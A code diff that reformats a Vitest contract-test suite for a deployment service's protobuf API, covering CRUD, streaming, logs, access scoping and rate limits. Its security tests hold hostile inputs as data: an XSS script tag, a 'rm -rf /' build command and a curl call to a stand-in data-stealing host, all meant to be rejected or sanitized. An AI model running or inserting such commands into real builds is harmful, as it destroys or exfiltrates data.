@@ -1,6 +1,6 @@
-import { describe, it, expect, beforeEach } from 'vitest';
-import { ConnectRouter } from '@connectrpc/connect';
-import { DeploymentService } from '../../src/generated/obiente/cloud/deployments/v1/deployment_service_connect';
+import { describe, it, expect, beforeEach } from "vitest";
+import { ConnectRouter } from "@connectrpc/connect";
+import { DeploymentService } from "../../src/generated/obiente/cloud/deployments/v1/deployment_service_connect";
 import {
   ListDeploymentsRequest,
   ListDeploymentsResponse,
@@ -18,25 +18,25 @@ import {
   GetDeploymentLogsResponse,
   Deployment,
   Pagination,
-} from '../../src/generated/obiente/cloud/deployments/v1/deployment_service_pb';
+} from "../../src/generated/obiente/cloud/deployments/v1/deployment_service_pb";
 
 /**
  * Contract tests for DeploymentService protobuf interface
  * These tests validate deployment lifecycle operations and streaming
  * Tests should FAIL initially until DeploymentService is implemented
  */
-describe('DeploymentService Contract Tests', () => {
+describe("DeploymentService Contract Tests", () => {
   let deploymentService: DeploymentService;
-  const mockOrgId = 'org_123';
-  const mockDeploymentId = 'deploy_456';
+  const mockOrgId = "org_123";
+  const mockDeploymentId = "deploy_456";
 
   beforeEach(() => {
     // This will fail until DeploymentService is properly implemented
     deploymentService = new DeploymentService();
   });
 
-  describe('ListDeployments', () => {
-    it('should accept ListDeploymentsRequest and return ListDeploymentsResponse', async () => {
+  describe("ListDeployments", () => {
+    it("should accept ListDeploymentsRequest and return ListDeploymentsResponse", async () => {
       const request = new ListDeploymentsRequest({
         organizationId: mockOrgId,
         page: 1,
@@ -53,10 +53,10 @@ describe('DeploymentService Contract Tests', () => {
       expect(response.pagination.perPage).toBe(10);
     });
 
-    it('should filter by deployment status when provided', async () => {
+    it("should filter by deployment status when provided", async () => {
       const request = new ListDeploymentsRequest({
         organizationId: mockOrgId,
-        status: 'ready',
+        status: "ready",
         page: 1,
         perPage: 10,
       });
@@ -65,21 +65,23 @@ describe('DeploymentService Contract Tests', () => {
 
       // All returned deployments should have 'ready' status
       for (const deployment of response.deployments) {
-        expect(deployment.status).toBe('ready');
+        expect(deployment.status).toBe("ready");
       }
     });
 
-    it('should respect organization-scoped access', async () => {
+    it("should respect organization-scoped access", async () => {
       const request = new ListDeploymentsRequest({
-        organizationId: 'unauthorized_org',
+        organizationId: "unauthorized_org",
         page: 1,
         perPage: 10,
       });
 
-      await expect(deploymentService.listDeployments(request)).rejects.toThrow(/not found|unauthorized/i);
+      await expect(deploymentService.listDeployments(request)).rejects.toThrow(
+        /not found|unauthorized/i
+      );
     });
 
-    it('should return deployments with complete information', async () => {
+    it("should return deployments with complete information", async () => {
       const request = new ListDeploymentsRequest({
         organizationId: mockOrgId,
         page: 1,
@@ -92,25 +94,31 @@ describe('DeploymentService Contract Tests', () => {
         expect(deployment.id).toBeDefined();
         expect(deployment.name).toBeDefined();
         expect(deployment.domain).toBeDefined();
-        expect(['static', 'nodejs', 'python', 'docker']).toContain(deployment.type);
-        expect(['building', 'ready', 'error', 'stopped']).toContain(deployment.status);
-        expect(['healthy', 'degraded', 'unhealthy']).toContain(deployment.healthStatus);
+        expect(["static", "nodejs", "python", "docker"]).toContain(
+          deployment.type
+        );
+        expect(["building", "ready", "error", "stopped"]).toContain(
+          deployment.status
+        );
+        expect(["healthy", "degraded", "unhealthy"]).toContain(
+          deployment.healthStatus
+        );
         expect(deployment.bandwidthUsage).toBeGreaterThanOrEqual(0);
         expect(deployment.storageUsage).toBeGreaterThanOrEqual(0);
       }
     });
   });
 
-  describe('CreateDeployment', () => {
-    it('should accept CreateDeploymentRequest and return CreateDeploymentResponse', async () => {
+  describe("CreateDeployment", () => {
+    it("should accept CreateDeploymentRequest and return CreateDeploymentResponse", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'My Portfolio',
-        type: 'static',
-        repositoryUrl: 'https://github.com/user/portfolio',
-        branch: 'main',
-        buildCommand: 'npm run build',
-        installCommand: 'npm install',
+        name: "My Portfolio",
+        type: "static",
+        repositoryUrl: "https://github.com/user/portfolio",
+        branch: "main",
+        buildCommand: "npm run build",
+        installCommand: "npm install",
       });
 
       // This will fail - no implementation yet
@@ -118,85 +126,97 @@ describe('DeploymentService Contract Tests', () => {
 
       expect(response).toBeInstanceOf(CreateDeploymentResponse);
       expect(response.deployment).toBeInstanceOf(Deployment);
-      expect(response.deployment.name).toBe('My Portfolio');
-      expect(response.deployment.type).toBe('static');
-      expect(response.deployment.repositoryUrl).toBe('https://github.com/user/portfolio');
-      expect(response.deployment.branch).toBe('main');
-      expect(response.deployment.status).toBe('building');
+      expect(response.deployment.name).toBe("My Portfolio");
+      expect(response.deployment.type).toBe("static");
+      expect(response.deployment.repositoryUrl).toBe(
+        "https://github.com/user/portfolio"
+      );
+      expect(response.deployment.branch).toBe("main");
+      expect(response.deployment.status).toBe("building");
       expect(response.deployment.domain).toBeDefined();
       expect(response.deployment.id).toBeDefined();
     });
 
-    it('should validate deployment name requirements', async () => {
+    it("should validate deployment name requirements", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: '', // Empty name
-        type: 'static',
-        branch: 'main',
+        name: "", // Empty name
+        type: "static",
+        branch: "main",
       });
 
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/name/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /name/i
+      );
     });
 
-    it('should validate deployment type', async () => {
+    it("should validate deployment type", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'Test Deployment',
-        type: 'invalid-type',
-        branch: 'main',
+        name: "Test Deployment",
+        type: "invalid-type",
+        branch: "main",
       });
 
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/type/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /type/i
+      );
     });
 
-    it('should validate repository URL format when provided', async () => {
+    it("should validate repository URL format when provided", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'Test Deployment',
-        type: 'static',
-        repositoryUrl: 'invalid-url',
-        branch: 'main',
+        name: "Test Deployment",
+        type: "static",
+        repositoryUrl: "invalid-url",
+        branch: "main",
       });
 
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/repository/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /repository/i
+      );
     });
 
-    it('should validate branch name format', async () => {
+    it("should validate branch name format", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'Test Deployment',
-        type: 'static',
-        branch: '', // Empty branch
+        name: "Test Deployment",
+        type: "static",
+        branch: "", // Empty branch
       });
 
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/branch/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /branch/i
+      );
     });
 
-    it('should respect organization deployment limits', async () => {
+    it("should respect organization deployment limits", async () => {
       // Mock organization with deployment limit reached
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'Over Limit Deployment',
-        type: 'static',
-        branch: 'main',
+        name: "Over Limit Deployment",
+        type: "static",
+        branch: "main",
       });
 
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/limit/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /limit/i
+      );
     });
 
-    it('should generate unique subdomain for deployment', async () => {
+    it("should generate unique subdomain for deployment", async () => {
       const request1 = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'App One',
-        type: 'static',
-        branch: 'main',
+        name: "App One",
+        type: "static",
+        branch: "main",
       });
 
       const request2 = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'App Two',
-        type: 'static',
-        branch: 'main',
+        name: "App Two",
+        type: "static",
+        branch: "main",
       });
 
       const [response1, response2] = await Promise.all([
@@ -210,8 +230,8 @@ describe('DeploymentService Contract Tests', () => {
     });
   });
 
-  describe('GetDeployment', () => {
-    it('should accept GetDeploymentRequest and return GetDeploymentResponse', async () => {
+  describe("GetDeployment", () => {
+    it("should accept GetDeploymentRequest and return GetDeploymentResponse", async () => {
       const request = new GetDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -225,16 +245,18 @@ describe('DeploymentService Contract Tests', () => {
       expect(response.deployment.id).toBe(mockDeploymentId);
     });
 
-    it('should enforce organization-scoped access', async () => {
+    it("should enforce organization-scoped access", async () => {
       const request = new GetDeploymentRequest({
-        organizationId: 'wrong_org',
+        organizationId: "wrong_org",
         deploymentId: mockDeploymentId,
       });
 
-      await expect(deploymentService.getDeployment(request)).rejects.toThrow(/not found|unauthorized/i);
+      await expect(deploymentService.getDeployment(request)).rejects.toThrow(
+        /not found|unauthorized/i
+      );
     });
 
-    it('should return complete deployment details', async () => {
+    it("should return complete deployment details", async () => {
       const request = new GetDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -249,49 +271,53 @@ describe('DeploymentService Contract Tests', () => {
     });
   });
 
-  describe('UpdateDeployment', () => {
-    it('should accept UpdateDeploymentRequest and return UpdateDeploymentResponse', async () => {
+  describe("UpdateDeployment", () => {
+    it("should accept UpdateDeploymentRequest and return UpdateDeploymentResponse", async () => {
       const request = new UpdateDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
-        name: 'Updated Name',
-        branch: 'develop',
-        buildCommand: 'npm run build:prod',
+        name: "Updated Name",
+        branch: "develop",
+        buildCommand: "npm run build:prod",
       });
 
       // This will fail - no implementation yet
       const response = await deploymentService.updateDeployment(request);
 
       expect(response).toBeInstanceOf(UpdateDeploymentResponse);
-      expect(response.deployment.name).toBe('Updated Name');
-      expect(response.deployment.branch).toBe('develop');
-      expect(response.deployment.buildCommand).toBe('npm run build:prod');
+      expect(response.deployment.name).toBe("Updated Name");
+      expect(response.deployment.branch).toBe("develop");
+      expect(response.deployment.buildCommand).toBe("npm run build:prod");
     });
 
-    it('should require deployment management permissions', async () => {
+    it("should require deployment management permissions", async () => {
       const request = new UpdateDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
-        name: 'Unauthorized Update',
+        name: "Unauthorized Update",
       });
 
       // Mock user without deployment permissions
-      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(/permission/i);
+      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(
+        /permission/i
+      );
     });
 
-    it('should validate updated field values', async () => {
+    it("should validate updated field values", async () => {
       const request = new UpdateDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
-        branch: '', // Invalid empty branch
+        branch: "", // Invalid empty branch
       });
 
-      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(/branch/i);
+      await expect(deploymentService.updateDeployment(request)).rejects.toThrow(
+        /branch/i
+      );
     });
   });
 
-  describe('TriggerDeployment', () => {
-    it('should accept TriggerDeploymentRequest and return TriggerDeploymentResponse', async () => {
+  describe("TriggerDeployment", () => {
+    it("should accept TriggerDeploymentRequest and return TriggerDeploymentResponse", async () => {
       const request = new TriggerDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -302,29 +328,33 @@ describe('DeploymentService Contract Tests', () => {
 
       expect(response).toBeInstanceOf(TriggerDeploymentResponse);
       expect(response.deploymentId).toBe(mockDeploymentId);
-      expect(response.status).toBe('building');
+      expect(response.status).toBe("building");
     });
 
-    it('should require deployment permissions', async () => {
+    it("should require deployment permissions", async () => {
       const request = new TriggerDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
       });
 
-      await expect(deploymentService.triggerDeployment(request)).rejects.toThrow(/permission/i);
+      await expect(
+        deploymentService.triggerDeployment(request)
+      ).rejects.toThrow(/permission/i);
     });
 
-    it('should prevent triggering deployment in invalid states', async () => {
+    it("should prevent triggering deployment in invalid states", async () => {
       // Mock deployment already in building state
       const request = new TriggerDeploymentRequest({
         organizationId: mockOrgId,
-        deploymentId: 'building_deployment_id',
+        deploymentId: "building_deployment_id",
       });
 
-      await expect(deploymentService.triggerDeployment(request)).rejects.toThrow(/state|building/i);
+      await expect(
+        deploymentService.triggerDeployment(request)
+      ).rejects.toThrow(/state|building/i);
     });
 
-    it('should queue deployment if build system is busy', async () => {
+    it("should queue deployment if build system is busy", async () => {
       const request = new TriggerDeploymentRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -333,12 +363,12 @@ describe('DeploymentService Contract Tests', () => {
       const response = await deploymentService.triggerDeployment(request);
 
       // Should handle queuing gracefully
-      expect(['building', 'queued']).toContain(response.status);
+      expect(["building", "queued"]).toContain(response.status);
     });
   });
 
-  describe('StreamDeploymentStatus', () => {
-    it('should accept StreamDeploymentStatusRequest and return stream', async () => {
+  describe("StreamDeploymentStatus", () => {
+    it("should accept StreamDeploymentStatusRequest and return stream", async () => {
       const request = new StreamDeploymentStatusRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -348,10 +378,10 @@ describe('DeploymentService Contract Tests', () => {
       const stream = deploymentService.streamDeploymentStatus(request);
 
       expect(stream).toBeDefined();
-      expect(typeof stream[Symbol.asyncIterator]).toBe('function');
+      expect(typeof stream[Symbol.asyncIterator]).toBe("function");
     });
 
-    it('should stream deployment status updates', async () => {
+    it("should stream deployment status updates", async () => {
       const request = new StreamDeploymentStatusRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -369,19 +399,23 @@ describe('DeploymentService Contract Tests', () => {
       }
 
       expect(updates.length).toBeGreaterThan(0);
-      
+
       for (const update of updates) {
         expect(update).toBeInstanceOf(DeploymentStatusUpdate);
         expect(update.deploymentId).toBe(mockDeploymentId);
-        expect(['building', 'ready', 'error', 'stopped']).toContain(update.status);
-        expect(['healthy', 'degraded', 'unhealthy']).toContain(update.healthStatus);
+        expect(["building", "ready", "error", "stopped"]).toContain(
+          update.status
+        );
+        expect(["healthy", "degraded", "unhealthy"]).toContain(
+          update.healthStatus
+        );
         expect(update.timestamp).toBeDefined();
       }
     });
 
-    it('should enforce organization access for streaming', async () => {
+    it("should enforce organization access for streaming", async () => {
       const request = new StreamDeploymentStatusRequest({
-        organizationId: 'wrong_org',
+        organizationId: "wrong_org",
         deploymentId: mockDeploymentId,
       });
 
@@ -395,7 +429,7 @@ describe('DeploymentService Contract Tests', () => {
       }).rejects.toThrow(/not found|unauthorized/i);
     });
 
-    it('should handle stream disconnection gracefully', async () => {
+    it("should handle stream disconnection gracefully", async () => {
       const request = new StreamDeploymentStatusRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -422,8 +456,8 @@ describe('DeploymentService Contract Tests', () => {
     });
   });
 
-  describe('GetDeploymentLogs', () => {
-    it('should accept GetDeploymentLogsRequest and return GetDeploymentLogsResponse', async () => {
+  describe("GetDeploymentLogs", () => {
+    it("should accept GetDeploymentLogsRequest and return GetDeploymentLogsResponse", async () => {
       const request = new GetDeploymentLogsRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -438,7 +472,7 @@ describe('DeploymentService Contract Tests', () => {
       expect(response.logs.length).toBeLessThanOrEqual(100);
     });
 
-    it('should return latest logs when lines not specified', async () => {
+    it("should return latest logs when lines not specified", async () => {
       const request = new GetDeploymentLogsRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -451,16 +485,18 @@ describe('DeploymentService Contract Tests', () => {
       expect(response.logs.length).toBeLessThanOrEqual(1000);
     });
 
-    it('should enforce organization access for logs', async () => {
+    it("should enforce organization access for logs", async () => {
       const request = new GetDeploymentLogsRequest({
-        organizationId: 'wrong_org',
+        organizationId: "wrong_org",
         deploymentId: mockDeploymentId,
       });
 
-      await expect(deploymentService.getDeploymentLogs(request)).rejects.toThrow(/not found|unauthorized/i);
+      await expect(
+        deploymentService.getDeploymentLogs(request)
+      ).rejects.toThrow(/not found|unauthorized/i);
     });
 
-    it('should return logs in chronological order', async () => {
+    it("should return logs in chronological order", async () => {
       const request = new GetDeploymentLogsRequest({
         organizationId: mockOrgId,
         deploymentId: mockDeploymentId,
@@ -471,17 +507,17 @@ describe('DeploymentService Contract Tests', () => {
 
       // Logs should be ordered by timestamp (newest first typically)
       expect(response.logs.length).toBeGreaterThan(0);
-      
+
       for (const log of response.logs) {
-        expect(typeof log).toBe('string');
+        expect(typeof log).toBe("string");
         expect(log.length).toBeGreaterThan(0);
       }
     });
 
-    it('should handle deployments with no logs', async () => {
+    it("should handle deployments with no logs", async () => {
       const request = new GetDeploymentLogsRequest({
         organizationId: mockOrgId,
-        deploymentId: 'new_deployment_id',
+        deploymentId: "new_deployment_id",
       });
 
       const response = await deploymentService.getDeploymentLogs(request);
@@ -491,12 +527,33 @@ describe('DeploymentService Contract Tests', () => {
     });
   });
 
-  describe('Security and Validation', () => {
-    it('should validate all organizationId parameters', async () => {
+  describe("Security and Validation", () => {
+    it("should validate all organizationId parameters", async () => {
       const requests = [
-        () => deploymentService.listDeployments(new ListDeploymentsRequest({ organizationId: '', page: 1, perPage: 10 })),
-        () => deploymentService.createDeployment(new CreateDeploymentRequest({ organizationId: '', name: 'test', type: 'static', branch: 'main' })),
-        () => deploymentService.getDeployment(new GetDeploymentRequest({ organizationId: '', deploymentId: 'test' })),
+        () =>
+          deploymentService.listDeployments(
+            new ListDeploymentsRequest({
+              organizationId: "",
+              page: 1,
+              perPage: 10,
+            })
+          ),
+        () =>
+          deploymentService.createDeployment(
+            new CreateDeploymentRequest({
+              organizationId: "",
+              name: "test",
+              type: "static",
+              branch: "main",
+            })
+          ),
+        () =>
+          deploymentService.getDeployment(
+            new GetDeploymentRequest({
+              organizationId: "",
+              deploymentId: "test",
+            })
+          ),
       ];
 
       for (const request of requests) {
@@ -504,54 +561,62 @@ describe('DeploymentService Contract Tests', () => {
       }
     });
 
-    it('should sanitize deployment names and commands', async () => {
+    it("should sanitize deployment names and commands", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
         name: '<script>alert("xss")</script>My App',
-        type: 'static',
-        branch: 'main',
-        buildCommand: 'rm -rf / && npm run build',
+        type: "static",
+        branch: "main",
+        buildCommand: "rm -rf / && npm run build",
       });
 
       const response = await deploymentService.createDeployment(request);
 
       // Should sanitize harmful content
-      expect(response.deployment.name).not.toContain('<script>');
-      expect(response.deployment.buildCommand).not.toContain('rm -rf');
-      expect(response.deployment.name).toContain('My App');
+      expect(response.deployment.name).not.toContain("<script>");
+      expect(response.deployment.buildCommand).not.toContain("rm -rf");
+      expect(response.deployment.name).toContain("My App");
     });
 
-    it('should rate limit deployment triggers', async () => {
-      const requests = Array.from({ length: 10 }, () =>
-        new TriggerDeploymentRequest({
-          organizationId: mockOrgId,
-          deploymentId: mockDeploymentId,
-        })
+    it("should rate limit deployment triggers", async () => {
+      const requests = Array.from(
+        { length: 10 },
+        () =>
+          new TriggerDeploymentRequest({
+            organizationId: mockOrgId,
+            deploymentId: mockDeploymentId,
+          })
       );
 
       // Should implement rate limiting for rapid deployments
-      const promises = requests.map(req => deploymentService.triggerDeployment(req));
-      
+      const promises = requests.map((req) =>
+        deploymentService.triggerDeployment(req)
+      );
+
       // Some later requests should be rate limited
-      await expect(Promise.all(promises)).rejects.toThrow(/rate limit|too many/i);
+      await expect(Promise.all(promises)).rejects.toThrow(
+        /rate limit|too many/i
+      );
     });
 
-    it('should validate deployment configuration security', async () => {
+    it("should validate deployment configuration security", async () => {
       const request = new CreateDeploymentRequest({
         organizationId: mockOrgId,
-        name: 'Test App',
-        type: 'static',
-        branch: 'main',
-        buildCommand: 'curl http://malicious-site.com/steal-data',
+        name: "Test App",
+        type: "static",
+        branch: "main",
+        buildCommand: "curl http://malicious-site.com/steal-data",
       });
 
       // Should validate build commands for security
-      await expect(deploymentService.createDeployment(request)).rejects.toThrow(/security|command/i);
+      await expect(deploymentService.createDeployment(request)).rejects.toThrow(
+        /security|command/i
+      );
     });
   });
 
-  describe('Performance Requirements', () => {
-    it('should respond to list deployments within performance target', async () => {
+  describe("Performance Requirements", () => {
+    it("should respond to list deployments within performance target", async () => {
       const request = new ListDeploymentsRequest({
         organizationId: mockOrgId,
         page: 1,
@@ -566,16 +631,20 @@ describe('DeploymentService Contract Tests', () => {
       expect(endTime - startTime).toBeLessThan(200);
     });
 
-    it('should handle concurrent deployment operations', async () => {
-      const requests = Array.from({ length: 5 }, (_, i) =>
-        new GetDeploymentRequest({
-          organizationId: mockOrgId,
-          deploymentId: `deployment_${i}`,
-        })
+    it("should handle concurrent deployment operations", async () => {
+      const requests = Array.from(
+        { length: 5 },
+        (_, i) =>
+          new GetDeploymentRequest({
+            organizationId: mockOrgId,
+            deploymentId: `deployment_${i}`,
+          })
       );
 
       const startTime = Date.now();
-      const promises = requests.map(req => deploymentService.getDeployment(req));
+      const promises = requests.map((req) =>
+        deploymentService.getDeployment(req)
+      );
       await Promise.allSettled(promises); // Allow some to fail
       const endTime = Date.now();
 
